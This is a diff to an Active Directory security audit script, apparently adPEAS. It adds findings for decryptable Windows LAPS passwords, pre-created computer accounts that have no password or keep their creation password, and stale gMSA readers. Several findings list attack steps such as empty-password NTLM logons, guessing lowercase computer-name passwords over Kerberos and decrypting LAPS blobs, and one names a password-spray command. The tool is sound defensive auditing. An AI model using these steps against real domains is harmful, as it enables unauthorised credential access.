@@ -191,15 +191,6 @@ $Script:ExtendedRightsGUIDs = @{
     '00000000-0000-0000-0000-000000000000' = 'All-Extended-Rights'
 }
 $Script:PropertyGUIDs = @{
-    'ms-Mcs-AdmPwd'                  = [GUID]'e5c0983d-b71e-4f1d-b798-9b0f5ecaeea3'
-    'ms-Mcs-AdmPwdExpirationTime'    = [GUID]'e5c0983e-b71e-4f1d-b798-9b0f5ecaeea3'
-    'msLAPS-Password'                     = [GUID]'35eb61e8-0ae2-4e1a-b60f-f6aa82d54867'
-    'msLAPS-EncryptedPassword'            = [GUID]'cc635e81-fda1-4e92-96d2-cf5d9a958a4f'
-    'msLAPS-EncryptedPasswordHistory'     = [GUID]'b0449bea-a05e-47eb-b1ce-a1c72b9c4a89'
-    'msLAPS-EncryptedDSRMPassword'        = [GUID]'64397849-c0bb-47e5-9eb4-a13cc22ee13c'
-    'msLAPS-EncryptedDSRMPasswordHistory' = [GUID]'ddb68b4d-8037-4dbe-8721-fcc3d59b57a7'
-    'msLAPS-CurrentPasswordVersion'       = [GUID]'5d848c52-82d7-4014-867b-714b3e4b6685'
-    'msLAPS-PasswordExpirationTime'       = [GUID]'ec38fa45-104d-4ede-b3b1-4620e8594575'
     'servicePrincipalName'           = [GUID]'f3a64788-5306-11d1-a9c5-0000f80367c1'
     'userAccountControl'             = [GUID]'bf967a68-0de6-11d0-a285-00aa003049e2'
     'member'                         = [GUID]'bf9679c0-0de6-11d0-a285-00aa003049e2'
@@ -585,13 +576,6 @@ $Script:WritePropertyAliases = @{
     'WriteDNSHostName'    = '72e39547-7b18-11d1-adef-00c04fd8d5cd'
 }
 $Script:ReadPropertyAliases = @{
-    'ReadLAPSPassword'    = 'e5c0983d-b71e-4f1d-b798-9b0f5ecaeea3'
-    'ReadLAPSExpiration'  = 'e5c0983e-b71e-4f1d-b798-9b0f5ecaeea3'
-    'ReadWindowsLAPSPassword'       = '35eb61e8-0ae2-4e1a-b60f-f6aa82d54867'
-    'ReadWindowsLAPSEncrypted'      = 'cc635e81-fda1-4e92-96d2-cf5d9a958a4f'
-    'ReadWindowsLAPSHistory'        = 'b0449bea-a05e-47eb-b1ce-a1c72b9c4a89'
-    'ReadWindowsLAPSDSRM'           = '64397849-c0bb-47e5-9eb4-a13cc22ee13c'
-    'ReadWindowsLAPSDSRMHistory'    = 'ddb68b4d-8037-4dbe-8721-fcc3d59b57a7'
     'ReadUnicodePwd'      = 'bf9679e1-0de6-11d0-a285-00aa003049e2'
     'ReadNTPassword'      = 'bf9679e1-0de6-11d0-a285-00aa003049e2'
     'ReadNTHash'          = 'bf9679e1-0de6-11d0-a285-00aa003049e2'
@@ -607,6 +591,15 @@ $Script:ReadPropertyAliases = @{
     'ReadGMSAMembership'  = '888eedd6-ce04-df40-b462-b8a50e41ba38'
     'ReadBitLockerRecoveryPassword' = '43061ac1-c8ad-4ccc-b785-2bfac20fc60a'
     'ReadBitLockerKeyPackage'       = '1fd55ea8-88a7-47dc-8129-0daa97186a54'
+}
+$Script:LAPSReadAliasAttributes = @{
+    'ReadLAPSPassword'           = @{ Attribute = 'ms-Mcs-AdmPwd';                       Confidential = $true }
+    'ReadLAPSExpiration'         = @{ Attribute = 'ms-Mcs-AdmPwdExpirationTime';         Confidential = $false }
+    'ReadWindowsLAPSPassword'    = @{ Attribute = 'msLAPS-Password';                     Confidential = $true }
+    'ReadWindowsLAPSEncrypted'   = @{ Attribute = 'msLAPS-EncryptedPassword';            Confidential = $true }
+    'ReadWindowsLAPSHistory'     = @{ Attribute = 'msLAPS-EncryptedPasswordHistory';     Confidential = $true }
+    'ReadWindowsLAPSDSRM'        = @{ Attribute = 'msLAPS-EncryptedDSRMPassword';        Confidential = $true }
+    'ReadWindowsLAPSDSRMHistory' = @{ Attribute = 'msLAPS-EncryptedDSRMPasswordHistory'; Confidential = $true }
 }
 $Script:SelfAliases = @{
     'SelfMembership' = 'bf9679c0-0de6-11d0-a285-00aa003049e2'
@@ -4127,7 +4120,7 @@ $Script:ExcludeAttributes = @(
     'MemberCount', 'ProtectedCount',
     'ActivityDetails',
     '_adPEASObjectType', '_adPEASContext', '_Severity', '_Risk', '_isExchangeGroup',
-    '_gmsaReaderVerdicts',
+    '_gmsaReaderVerdicts', '_gmsaReaderLabels',
     '_IsEffective', '_HasAnyLink',
     '_ReachScope', '_ReachInactive', '_ReachUnlinked',
     '_DeletesTask', '_UNCCard', '_CommandSeverity', '_RunAsSeverity',
@@ -4210,6 +4203,13 @@ function Get-ObjectTypeForOrdering {
         return 'User'
     }
 }
+function Test-IsEmptyAttributeValue {
+    param($Value)
+    if ($null -eq $Value) { return $true }
+    if ($Value -is [bool]) { return $false }
+    if ($Value -is [byte[]]) { return ($Value.Length -eq 0) }
+    return ($Value -eq '')
+}
 function Get-OrderedAttributes {
     [CmdletBinding()]
     param(
@@ -4233,7 +4233,7 @@ function Get-OrderedAttributes {
     $alwaysShowEmpty = @('LinkedOUs')
     foreach ($attrName in $primaryAttrNames) {
         $value = $Object.$attrName
-        $isEmpty = ($null -eq $value) -or ($value -isnot [bool] -and $value -eq '')
+        $isEmpty = Test-IsEmptyAttributeValue -Value $value
         if (-not $isEmpty -or ($attrName -in $alwaysShowEmpty -and $Object.PSObject.Properties[$attrName])) {
             $severity = Get-AttributeSeverity -Name $attrName -Value $value -IsComputer $IsComputer -SourceObject $Object
             [void]$result.Primary.Add(@{
@@ -4249,7 +4249,7 @@ function Get-OrderedAttributes {
         foreach ($attrName in @($Script:StrictExtendedAttributes[$objectType])) {
             if (-not $attrName -or $processedAttrs.ContainsKey($attrName)) { continue }
             $value = $Object.$attrName
-            if (($null -eq $value) -or ($value -isnot [bool] -and $value -eq '')) { continue }
+            if (Test-IsEmptyAttributeValue -Value $value) { continue }
             [void]$result.Extended.Add(@{
                 Name = $attrName
                 Value = $value
@@ -4261,7 +4261,7 @@ function Get-OrderedAttributes {
     foreach ($prop in $Object.PSObject.Properties) {
         if ($processedAttrs.ContainsKey($prop.Name)) { continue }
         if ($prop.Name -in $Script:ExcludeAttributes) { continue }
-        $isEmptyValue = ($null -eq $prop.Value) -or ($prop.Value -isnot [bool] -and $prop.Value -eq '')
+        $isEmptyValue = Test-IsEmptyAttributeValue -Value $prop.Value
         if ($isEmptyValue -and $prop.Name -notin $alwaysShowEmpty) { continue }
         $severity = Get-AttributeSeverity -Name $prop.Name -Value $prop.Value -IsComputer $IsComputer -SourceObject $Object
         if ($prop.Name -ieq 'Owner') {
@@ -4367,6 +4367,20 @@ function Convert-DefaultToRenderValues {
         [Parameter(Mandatory=$true)]
         $Context
     )
+    if ($Value -is [byte[]]) {
+        if ($Value.Length -eq 0) { return $null }
+        $blobMatch = Get-TriggerMatch -Name $Name -Value $Value -IsComputer $Context.IsComputer -SourceObject $Context.SourceObject
+        $blobSeverity = if ($blobMatch -and $blobMatch.Severity) { [string]$blobMatch.Severity } else { 'Standard' }
+        $blobFindingId = if ($blobMatch) { $blobMatch.FindingId } else { $null }
+        return @{
+            RowType         = 'SingleValue'
+            OverallSeverity = $blobSeverity
+            ForceAttributeClass = $false
+            Values          = @(
+                New-RenderValue -Display "[binary, $($Value.Length) bytes]" -Severity $blobSeverity -FindingId $blobFindingId -RawValue $Value
+            )
+        }
+    }
     if ($Value -is [PSCustomObject] -and ($Value.psobject.TypeNames -contains 'adPEAS.ImageData')) {
         return @{
             RowType         = 'Image'
@@ -4558,10 +4572,8 @@ function ConvertTo-ActivityDate {
     }
     if ($Value -is [string]) {
         if ($Value -match '^(\d{14})(?:\.\d+)?Z?$') {
-            $gtDate = [DateTime]::MinValue
-            if ([DateTime]::TryParseExact($Matches[1], 'yyyyMMddHHmmss', [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal, [ref]$gtDate)) {
-                return $gtDate.ToLocalTime()
-            }
+            $gtDate = ConvertFrom-adPEASGeneralizedTime $Value
+            if ($null -ne $gtDate) { return $gtDate }
         }
         $parsed = 0L
         if ([long]::TryParse($Value, [ref]$parsed)) {
@@ -5559,7 +5571,7 @@ $Script:FindingDefinitions = @{
         MITRE = "T1550.003"
         Triggers = @(
             @{ Attribute = 'rbcdTarget'; Severity = 'Finding' }
-            @{ Attribute = 'rbcdPrincipalRisk'; Pattern = 'a broad group|not an identity this domain expects|unresolved - a deleted or foreign principal'; Severity = 'Finding' }
+            @{ Attribute = 'rbcdPrincipalRisk'; Pattern = 'a broad group|not an identity this domain expects|unresolved - a principal'; Severity = 'Finding' }
             @{ Attribute = 'msDS-AllowedToActOnBehalfOfOtherIdentity'; Custom = 'rbcd_principal_is_dangerous'; Severity = 'Finding'; SeverityOnly = $true }
             @{ Attribute = 'msDS-AllowedToActOnBehalfOfOtherIdentity'; Severity = 'Hint'; SeverityOnly = $true }
         )
@@ -10101,6 +10113,43 @@ Set-GPPermission -Name 'GPO_NAME' -TargetName 'Authenticated Users' -TargetType 
             @{ Attribute = 'lapsReadContext'; Severity = 'Hint'; SeverityOnly = $true }
         )
     }
+    'LAPS_PASSWORD_DECRYPTABLE' = @{
+        Title = "Encrypted LAPS Password Decryptable by This Account"
+        Risk = "Finding"
+        BaseScore = 55
+        Description = "The account this scan runs as is in the group this computer's Windows LAPS password is encrypted for - its token groups hold the SID the blob names, which is exactly what a domain controller checks before it hands out the key. It can therefore read the password: the scan only did not take the last step on this host. The row says why - Windows' own error code, or a scanning host that is in no domain, where Windows requests no key at all. From a domain member of any domain, a Kerberos session of this account decrypts it."
+        Impact = @(
+            "The account can obtain the local administrator password of this computer"
+            "The password gives local administrator access, and with it the credentials cached on the machine"
+            "That the scan did not decrypt it here does not limit the account - only the host the scan ran on"
+        )
+        Attack = @(
+            "1. Read msLAPS-EncryptedPassword, which the account may read"
+            "2. Decrypt it on any domain member, with this account's credentials in the logon session"
+            "3. Log on to the computer as its local administrator"
+        )
+        Remediation = @(
+            "Review who is in the group ADPasswordEncryptionPrincipal names - by default Domain Admins - and keep it as small as the password deserves"
+            "Grant the read right on msLAPS-EncryptedPassword only to accounts that are meant to decrypt it"
+            "Expected for an administrative account: then this is the access the account is meant to have"
+        )
+        RemediationCommands = @(
+            @{
+                Description = "Show the decryptor group and the password the account can read"
+                Command = "Get-LapsADPassword -Identity 'COMPUTER_NAME' | Select-Object ComputerName, Source, DecryptionStatus, AuthorizedDecryptor"
+            }
+        )
+        References = @(
+            @{ Title = "Windows LAPS password encryption - Microsoft"; Url = "https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview" }
+            @{ Title = "Get-LapsADPassword - Microsoft"; Url = "https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword" }
+        )
+        Tools = @("LAPSToolkit")
+        MITRE = "T1552.004"
+        Triggers = @(
+            @{ Attribute = 'lapsDecryption'; Severity = 'Finding' }
+            @{ Attribute = 'lapsDecryption'; Custom = 'laps_read_is_expected'; Severity = 'Hint'; SeverityOnly = $true }
+        )
+    }
     'BITLOCKER_KEY_READABLE' = @{
         Title = "BitLocker Recovery Key Readable"
         Risk = "Hint"
@@ -13490,6 +13539,106 @@ Set-ADAccountPassword -Identity 'ACCOUNTNAME' -Reset -NewPassword (Read-Host -As
         MITRE = "T1003.006"
         Triggers = @(
             @{ Attribute = 'machinePasswordAge'; Pattern = '^DOMAIN CONTROLLER'; Severity = 'Finding' }
+        )
+    }
+    'COMPUTER_PASSWORD_NEVER_SET' = @{
+        Title = "Computer Account Without a Password"
+        Risk = "Finding"
+        BaseScore = 25
+        Description = "This computer account has never had a password set: pwdLastSet is 0, userAccountControl carries PASSWD_NOTREQD, and no Windows client ever joined it - operatingSystem and dNSHostName are empty. 'dsadd computer' creates computer accounts this way. The account has no Kerberos keys at all, but over NTLM it logs on with an empty password, so anyone who knows its name has a domain identity."
+        Impact = @(
+            "A domain identity for anyone on the network who knows or guesses the account name - no password needed"
+            "Whatever the account was given in preparation for a join that never came - group memberships, delegated rights - comes with it"
+            "Where ms-DS-MachineAccountQuota is 0, it is the computer account an attacker could not create"
+        )
+        Attack = @(
+            "1. Attacker lists computer accounts without operatingSystem whose pwdLastSet is 0"
+            "2. Authenticates over NTLM as the account with an empty password"
+            "3. Uses the identity - to read the directory, through the account's own rights, or as the computer account an RBCD setup needs"
+        )
+        Remediation = @(
+            "Join the computer the account was created for - the join sets a random password - or delete the account"
+            "Otherwise set a random password and clear PASSWD_NOTREQD"
+            "Create computer accounts in advance with a tool that sets a random password"
+        )
+        RemediationCommands = @(
+            @{
+                Description = "Find computer accounts that never had a password set"
+                Command = "Get-ADComputer -LDAPFilter '(&(pwdLastSet=0)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(operatingSystem=*)))' -Properties whenCreated,pwdLastSet"
+            }
+            @{
+                Description = "Require a password on the account"
+                Command = "Set-ADComputer -Identity 'COMPUTER_NAME' -PasswordNotRequired `$false"
+            }
+        )
+        References = @(
+            @{ Title = "Diving into Pre-Created Computer Accounts - TrustedSec"; Url = "https://trustedsec.com/blog/diving-into-pre-created-computer-accounts" }
+        )
+        Tools = @("Impacket")
+        MITRE = "T1078.002"
+        Triggers = @(
+            @{ Attribute = 'passwordSinceCreation'; Pattern = '^Never set'; Severity = 'Finding' }
+        )
+    }
+    'COMPUTER_CREATION_PASSWORD_IN_USE' = @{
+        Title = "Computer Account in Use With Its Creation Password"
+        Risk = "Hint"
+        BaseScore = 15
+        Description = "This computer account has logged on, but no Windows client ever joined it - operatingSystem and dNSHostName are empty - and its password still dates from the creation of the account. A join sets a new password, so whatever uses this account uses the password it was created with. ADUC with 'Assign this computer account as a pre-Windows 2000 computer' and 'net computer /add' set that password to the computer name in lowercase; Kerberos issues a ticket for it, NTLM refuses a workstation account. A computer account created by a user through ms-DS-MachineAccountQuota - for an RBCD setup, for instance - looks the same, with ms-DS-CreatorSID naming the user. Invoke-PasswordSpray -Auto -ComputerDefault tests the default password, one Kerberos request per account."
+        Impact = @(
+            "If the creation password is the default, anyone who knows the name has the account"
+            "What uses it is not a joined Windows member: an appliance, a script - or someone who guessed the password"
+        )
+        Attack = @(
+            "1. Attacker lists computer accounts without operatingSystem whose password dates from their creation"
+            "2. Requests a Kerberos ticket for each with the computer name in lowercase"
+            "3. Uses the accounts that answer, and their rights"
+        )
+        Remediation = @(
+            "Find out what uses the account; delete it if nothing should"
+            "Set a random password, and give it to the owner of what uses the account"
+            "Where ms-DS-CreatorSID names a user, find out why that user created a computer account"
+        )
+        RemediationCommands = @(
+            @{
+                Description = "See who created the account and when it last logged on"
+                Command = "Get-ADComputer -Identity 'COMPUTER_NAME' -Properties 'ms-DS-CreatorSID',whenCreated,pwdLastSet,lastLogonTimestamp"
+            }
+        )
+        References = @(
+            @{ Title = "Diving into Pre-Created Computer Accounts - TrustedSec"; Url = "https://trustedsec.com/blog/diving-into-pre-created-computer-accounts" }
+        )
+        Tools = @("Impacket", "Rubeus")
+        MITRE = "T1078.002"
+        Triggers = @(
+            @{ Attribute = 'passwordSinceCreation'; Pattern = '^Unchanged, in use'; Severity = 'Hint' }
+        )
+    }
+    'COMPUTER_PRECREATED_NOT_JOINED' = @{
+        Title = "Computer Account Created in Advance and Never Used"
+        Risk = "Hint"
+        BaseScore = 10
+        Description = "This computer account was created in advance and never joined or used: operatingSystem and dNSHostName are empty, lastLogonTimestamp is not set, and its password still dates from the creation of the account. How guessable that password is depends on the tool that created it: ADUC with 'Assign this computer account as a pre-Windows 2000 computer' and 'net computer /add' set the computer name in lowercase, ADUC without that option and New-ADComputer do not. Nothing in the directory tells these apart. One Kerberos request with the name in lowercase does - and a miss counts against the account's bad password count. Invoke-PasswordSpray -Auto -ComputerDefault makes that request for every such account."
+        Impact = @(
+            "If the password is the default, anyone who knows the name gets a domain identity - and the account's first logon is theirs"
+            "Rights granted to the account in preparation for the join come with it"
+        )
+        Attack = @(
+            "1. Attacker lists enabled computer accounts without operatingSystem that never logged on"
+            "2. Requests a Kerberos ticket for each with the computer name in lowercase"
+            "3. Uses the accounts that answer"
+        )
+        Remediation = @(
+            "Join the computer the account was created for, or delete the account"
+            "Create computer accounts in advance without the pre-Windows 2000 option"
+        )
+        References = @(
+            @{ Title = "Diving into Pre-Created Computer Accounts - TrustedSec"; Url = "https://trustedsec.com/blog/diving-into-pre-created-computer-accounts" }
+        )
+        Tools = @("Impacket", "Rubeus")
+        MITRE = "T1078.002"
+        Triggers = @(
+            @{ Attribute = 'passwordSinceCreation'; Pattern = '^Unchanged, never used'; Severity = 'Hint' }
         )
     }
     'MACHINE_QUOTA_UNRESTRICTED' = @{
@@ -17692,6 +17841,35 @@ $acl.Access | Where-Object {
             @{ Attribute = 'msds-groupmsamembership'; Severity = 'Hint' }
         )
     }
+    'MSA_READER_DELETED' = @{
+        Title = "Managed Service Account Names a Principal That No Longer Exists"
+        Risk = "Hint"
+        BaseScore = 10
+        Description = "msDS-GroupMSAMembership of this managed service account names a SID of this domain that no object carries any more, and that no account holds in its sIDHistory either. The principal it stood for has been deleted. A SID is never issued again, so no account can ever hold this entry, and nobody retrieves the password - or, on a delegated Managed Service Account, uses it - through it. It is a stale entry. Seen from an account that is not privileged, the same picture can also mean an object that account may not read; the row then says so."
+        Impact = @(
+            "Nobody can use the entry: the SID belongs to no account and is never reissued"
+            "Restoring the deleted principal from the Recycle Bin would bring it back with its SID - which takes a privileged account"
+            "The entry makes the list harder to review, and an unreadable SID is easily taken for an unknown reader"
+        )
+        Remediation = @(
+            "Remove the entry, so the list names only the hosts that run the service"
+            "Re-set PrincipalsAllowedToRetrieveManagedPassword to the principals that should be there - Set-ADServiceAccount writes the whole list"
+        )
+        RemediationCommands = @(
+            @{
+                Description = "List the principals the account names"
+                Command = "Get-ADServiceAccount -Identity 'GMSA_NAME' -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword"
+            }
+            @{
+                Description = "Write the list again with only the principals that should be there"
+                Command = "Set-ADServiceAccount -Identity 'GMSA_NAME' -PrincipalsAllowedToRetrieveManagedPassword 'SERVICE_HOSTS'"
+            }
+        )
+        References = @(
+            @{ Title = "gMSA Overview"; Url = "https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" }
+        )
+        MITRE = "T1078"
+    }
     'ACL_INHERITED_FROM' = @{
         Title = "ACL Inheritance Source"
         Risk = "Note"
@@ -18053,21 +18231,22 @@ $acl.Access | Where-Object {
         )
     }
     'LAPS_ENCRYPTED_PASSWORD' = @{
-        Title = "Encrypted LAPS Password Readable, Without the Decryptor"
+        Title = "Encrypted LAPS Password Readable"
         Risk = "Hint"
         BaseScore = 20
-        Description = "msLAPS-EncryptedPassword came back for this computer, so the account adPEAS runs as can read it. What came back is a blob: Windows LAPS encrypts the password for the principal named in ADPasswordEncryptionPrincipal - Domain Admins by default - and only that principal can open it through NCryptUnprotectSecret. adPEAS attempts the decryption, and where it succeeds the row carries msLAPS-Password and the password-readable write-up instead of this one. This row is the other outcome: the attribute is readable and the blob is not openable by this account, which is exactly what the encrypted generation is for."
+        Description = "msLAPS-EncryptedPassword came back for this computer, so the account adPEAS runs as can read it. What came back is a blob: Windows LAPS encrypts the password for the principal named in ADPasswordEncryptionPrincipal - Domain Admins by default - and only a member of that principal can open it through NCryptUnprotectSecret, with a key the domain controller hands out to members alone. Reading the attribute takes the read right, opening it takes that membership, and this row shows only the first. Whether this account can open the blob is decided by the check 'Testing LAPS password read access for current user': a computer it opens is listed there with msLAPS-Password and the password-readable write-up, one it cannot open is counted there as stored but not readable."
         Impact = @(
-            "Not a password read today - without the configured decryptor the blob stays a blob"
-            "The read right is granted though, so it becomes a password read the moment the account reaches the decryptor principal, which is a group membership rather than an ACL change"
+            "Not a password read for an account outside the decryptor principal - for that account the blob stays a blob"
+            "A password read for an account inside it - an audit run as Domain Admins, the default decryptor, reads a blob it can open"
+            "Where the account is outside, the read right is granted though, so it becomes a password read the moment the account reaches the decryptor principal, which is a group membership rather than an ACL change"
             "The blob names its decryptor: the target SID parses out of it without any right, which tells an attacker precisely which group to go after"
-            "Reported as a hint rather than a finding on purpose - calling it a password read teaches the reader that the encryption buys nothing"
+            "Reported as a hint rather than a finding on purpose - calling every readable blob a password read teaches the reader that the encryption buys nothing; the check that opens them reports the ones that are"
         )
         Attack = @(
             "1. Attacker reads msLAPS-EncryptedPassword, which the ACL allows, and keeps the blobs"
             "2. Parses the target SID out of them to learn which principal can decrypt"
             "3. Looks for a path into that principal, by default Domain Admins"
-            "4. Opens every blob collected earlier, offline, as soon as that path exists"
+            "4. Opens every blob collected earlier as soon as that path exists - from any domain member, where Windows requests the key from a DC"
         )
         Remediation = @(
             "Review the read right rather than the encryption: an account that cannot decrypt has no use for the attribute"
@@ -20622,7 +20801,7 @@ function Test-CustomTrigger {
             if ($SourceObject -and $SourceObject.rbcdTarget) { return $true }
             foreach ($entry in @($SourceObject.rbcdPrincipalRisk)) {
                 if ([string]::IsNullOrWhiteSpace($entry)) { continue }
-                if ($entry -match 'a broad group|not an identity this domain expects|unresolved - a deleted or foreign principal') { return $true }
+                if ($entry -match 'a broad group|not an identity this domain expects|unresolved - a principal') { return $true }
             }
             return $false
         }
@@ -21274,6 +21453,20 @@ function Convert-GMSAToRenderValues {
     if ($sourceObject -and $sourceObject.PSObject.Properties['_gmsaReaderVerdicts']) {
         $readerVerdicts = $sourceObject._gmsaReaderVerdicts
     }
+    $readerLabels = $null
+    if ($sourceObject -and $sourceObject.PSObject.Properties['_gmsaReaderLabels']) {
+        $readerLabels = $sourceObject._gmsaReaderLabels
+    }
+    $lookupBySID = {
+        param($Map, [string]$Key)
+        if (-not $Map -or -not $Key) { return $null }
+        if ($Map -is [System.Collections.IDictionary]) {
+            if ($Map.Contains($Key)) { return [string]$Map[$Key] }
+            return $null
+        }
+        if ($Map.PSObject.Properties[$Key]) { return [string]$Map.PSObject.Properties[$Key].Value }
+        return $null
+    }
     $readerCard = 'GMSA_PASSWORD_READABLE'
     if ($sourceObject -and $sourceObject.PSObject.Properties['objectClass'] -and
         @($sourceObject.objectClass) -icontains 'msDS-DelegatedManagedServiceAccount') {
@@ -21285,15 +21478,14 @@ function Convert-GMSAToRenderValues {
         $findingId = 'GMSA_MEMBERSHIP_INFO'
         $principalSID = [string]$principal.SID
         if ($readerVerdicts -and $principalSID) {
-            $verdict = 'NotReader'
-            if ($readerVerdicts -is [System.Collections.IDictionary]) {
-                if ($readerVerdicts.Contains($principalSID)) { $verdict = [string]$readerVerdicts[$principalSID] }
-            } elseif ($readerVerdicts.PSObject.Properties[$principalSID]) {
-                $verdict = [string]$readerVerdicts.PSObject.Properties[$principalSID].Value
-            }
+            $verdict = & $lookupBySID $readerVerdicts $principalSID
+            if (-not $verdict) { $verdict = 'NotReader' }
             if ($verdict -in @('Broad', 'Unexpected')) {
                 $severity = 'Finding'
                 $findingId = $readerCard
+            } elseif ($verdict -in @('Deleted', 'DeletedOrHidden')) {
+                $severity = 'Hint'
+                $findingId = 'MSA_READER_DELETED'
             } else {
                 $severity = 'Standard'
                 $findingId = $null
@@ -21308,7 +21500,10 @@ function Convert-GMSAToRenderValues {
                 $findingId = $null
             }
         }
-        $renderValues += New-RenderValue -Display $principal.Name -Severity $severity `
+        $display = $principal.Name
+        $label = & $lookupBySID $readerLabels $principalSID
+        if ($label) { $display = $label }
+        $renderValues += New-RenderValue -Display $display -Severity $severity `
             -FindingId $findingId -RawValue $principal -Metadata @{ SID = $principal.SID }
     }
     $maxSev = Get-MaxSeverityFromValues -Values $renderValues
@@ -21869,11 +22064,19 @@ function Convert-FileTimeSentinelToRenderValues {
         'pwdLastSet' {
             $source = if ($Context) { $Context.SourceObject } else { $null }
             $uac = if ($source) { $source.userAccountControl } else { $null }
-            $neverExpires = (@($uac) -contains 'DONT_EXPIRE_PASSWORD')
-            if (-not $neverExpires -and $null -ne $uac -and "$uac" -match '^\d+$') {
-                $neverExpires = (([int64]"$uac") -band 0x10000) -ne 0
+            $uacFlags = @($uac)
+            $uacNumber = $null
+            if ($null -ne $uac -and "$uac" -match '^\d+$') { $uacNumber = [int64]"$uac" }
+            $hasFlag = {
+                param([string]$FlagName, [int64]$Bit)
+                ($uacFlags -contains $FlagName) -or ($null -ne $uacNumber -and ($uacNumber -band $Bit) -ne 0)
             }
-            if ($neverExpires) { 'Never' } else { 'Never - must change at next logon' }
+            $neverExpires = & $hasFlag 'DONT_EXPIRE_PASSWORD' 0x10000
+            $isComputerAccount = (& $hasFlag 'WORKSTATION_TRUST_ACCOUNT' 0x1000) -or (& $hasFlag 'SERVER_TRUST_ACCOUNT' 0x2000)
+            $passwordNotRequired = & $hasFlag 'PASSWD_NOTREQD' 0x20
+            if ($isComputerAccount -and $passwordNotRequired) { 'Never set' }
+            elseif ($neverExpires) { 'Never' }
+            else { 'Never - must change at next logon' }
         }
         'lockoutTime' { 'Not locked out' }
         default       { 'Never' }
@@ -23255,6 +23458,7 @@ $Script:ObjectTypeDefinitions = [ordered]@{
             "Which principals are allowed to delegate to the resource"
             "Whether an entry grants anything: one with generic rights only (GA) is accepted by AD but ignored by the KDC, and is reported as inert"
             "Whether any of them is a broad group, or an identity this domain does not expect to delegate"
+            "An entry that names only a SID: an account holding it through sIDHistory is judged as that account; a SID of this domain nothing holds any more is a deleted principal and delegates nothing; one of another domain stays a finding"
             "Whether the resource itself is a Domain Controller"
             "Not tested: who may write the attribute, which decides who can add themselves to it - the ACL and ownership sections answer that"
         )
@@ -23386,6 +23590,7 @@ $Script:ObjectTypeDefinitions = [ordered]@{
             "msDS-GroupMSAMembership (who can retrieve passwords)"
             "Whether password access follows least privilege"
             "Non-privileged principals with password access"
+            "Readers that no longer exist: a SID of this domain no object carries and no account holds in its sIDHistory - a stale entry, reported apart, not as password access"
             "The owner of that descriptor, who may rewrite the DACL inside it"
             "msDS-ManagedPasswordInterval (how long a stolen password stays valid)"
             "accountExpires (when the account stops authenticating)"
@@ -23464,6 +23669,7 @@ $Script:ObjectTypeDefinitions = [ordered]@{
         WhatWeCheck = @(
             "msDS-GroupMSAMembership (who may use the dMSA)"
             "Principals other than privileged accounts, operators and service hosts"
+            "Principals that no longer exist - reported apart, as stale entries"
             "The owner of that descriptor, who may rewrite the DACL inside it"
             "Read only where the scan can read the dMSAs - by default only administrators, Account Operators and their creator can"
         )
@@ -23796,6 +24002,10 @@ $Script:ObjectTypeDefinitions = [ordered]@{
         WhatWeCheck = @(
             "Computers where current user can read ms-Mcs-AdmPwd"
             "Computers where current user can read msLAPS-Password"
+            "Computers whose msLAPS-EncryptedPassword names a decryptor group the current user is in, decrypted on this machine"
+            "Where such a blob is not decrypted here - Windows refused, or the host is in no domain, where Windows requests no key - the computer is still listed and rated by the account: a finding for one that is not privileged, expected for one that is. Its token groups decide, which is what the domain controller checks before it hands out the key; the reason is on each computer"
+            "The decryptor each encrypted password that did not open names, per line - the principal a path to it has to reach, readable from the blob without any right"
+            "Where the current user's groups cannot be read: encrypted passwords counted as not tested - a blob can open from the Windows key cache, or with the logon's own credentials after an NTLM bind, so a decryption would not say what that account may read"
             "Scope of LAPS password access"
         )
         SecureMessage = "No readable LAPS passwords found. The current user does not have access to any local administrator passwords managed by LAPS, indicating proper access controls are in place."
@@ -24068,6 +24278,22 @@ $Script:ObjectTypeDefinitions = [ordered]@{
         )
         SecureMessage = "Every computer that logged on in the last 30 days has changed its machine account password within 90 days."
         PrimaryFindingId = 'COMPUTER_PASSWORD_NOT_ROTATED'
+    }
+    'ComputerInitialPassword' = @{
+        TitleFormat = "Creation Password: {Name}"
+        Module = "Computer"
+        Category = "Computers"
+        SectionTitle = "Computer Accounts With Their Creation Password"
+        Summary = "Finds enabled computer accounts that no Windows client joined and whose password is still the one they were created with."
+        WhyItMatters = "A computer account created in advance gets its first password from the tool that creates it - the computer name in lowercase, or none at all. A join replaces it with a random one. An account that was never joined keeps it, and anyone who knows the name can log on as the account."
+        WhatWeCheck = @(
+            "Enabled computer accounts without operatingSystem and dNSHostName - no Windows client ever joined them"
+            "Whether a password was ever set (pwdLastSet 0 with PASSWD_NOTREQD), or whether it dates from the creation of the account"
+            "Whether the account has logged on since (lastLogonTimestamp)"
+            "Not tested: whether a password really is the default - that takes a logon attempt per account, which the scan does not make"
+        )
+        SecureMessage = "No enabled computer account still carries the password it was created with."
+        PrimaryFindingId = 'COMPUTER_PASSWORD_NEVER_SET'
     }
     'OutdatedComputer' = @{
         TitleFormat = "Outdated Computer: {Name}"
@@ -24967,10 +25193,16 @@ function ConvertFrom-FindingsCacheValue {
         [int]$Depth = 0
     )
     if ($null -eq $Value) { return $null }
+    if ($Value -is [datetime]) {
+        if ([string]$Value.Kind -eq 'Utc') { return $Value.ToLocalTime() }
+        return $Value
+    }
     if ($Value -is [string]) {
         if ($Value -match '^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{1,7})?(Z|[+-]\d{2}:\d{2})?$') {
             try {
-                return [datetime]::Parse($Value, [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::RoundtripKind)
+                $parsed = [datetime]::Parse($Value, [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::RoundtripKind)
+                if ([string]$parsed.Kind -eq 'Utc') { return $parsed.ToLocalTime() }
+                return $parsed
             } catch {
                 return $Value
             }
@@ -24999,13 +25231,10 @@ function ConvertFrom-FindingsCacheJson {
         [string]$Json
     )
     if ([string]::IsNullOrWhiteSpace($Json)) { return $null }
-    $utcAttributes = $Script:LDAPGeneralizedTimeAttributes
-    $epoch = New-Object DateTime(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
